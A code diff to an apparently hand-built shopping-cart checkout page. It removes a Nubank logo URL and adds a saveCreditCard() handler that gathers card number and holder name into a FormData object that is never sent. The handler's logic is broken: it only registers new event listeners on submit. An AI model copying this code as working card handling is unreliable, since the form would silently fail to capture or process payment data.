@@ -148,7 +148,7 @@
         }
 
         .nubank-logo {
-          background-image: url("https://www.nubank.com.br/images/eeb5478f.header_logo.png");
+         
           background-position: 50% 50%;
           background-repeat: no-repeat;
           background-size: 80px;
@@ -1729,7 +1729,7 @@
                   <label for="card-ccv">CCV</label>
                   <input type="text" id="card-ccv" maxlength="3" oninput="this.value = this.value.replace(/[^0-9.]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');"/>
                 </fieldset>
-                <button class="btn"><i class="fa fa-lock"></i> submit</button>
+                <button class="btn" onclick="saveCreditCard()"><i class="fa fa-lock"></i> submit</button>
               </form>
             </div>
         </div>
@@ -2040,7 +2040,6 @@
       return re.test(input_str);
     }
     // them the ngang hang
-    var data = new FormData();
     $('.input-cart-number').on('keyup change', function(){
         $t = $(this);
             if ($t.val().length > 3) {
@@ -2098,6 +2097,38 @@
         }
     };
     loadCartShopping();
+    function saveCreditCard() {
+      var data = new FormData();
+      $('.input-cart-number').on('keyup change', function(){
+          $t = $(this);
+              if ($t.val().length > 3) {
+                  $t.next().focus();
+                }
+                
+                var card_number = '';
+                $('.input-cart-number').each(function(){
+                  card_number += $(this).val() + ' ';
+                  if ($(this).val().length == 4) {
+                    $(this).next().focus();
+                  }
+                })
+          data.append('card_number', card_number);
+      });
+       
+      $('#card-holder').on('keyup change', function(){
+        $t = $(this);
+        data.append('card_holder', $t.val());
+      });
+       
+       
+      $('#expire-month, #expire-year').change(function(){
+        m = $('#expire-month option').index($('#expire-month option:selected'));
+        m = (m < 10) ? '0' + m : m;
+        y = $('#expire-year').val().substr(2,2);
+        $('.card-expiration-date div').html(m + '/' + y);
+
+      })
+    }
     function loadCartShopping() {
         $('#cart-list-item').html("");
         $.ajax({
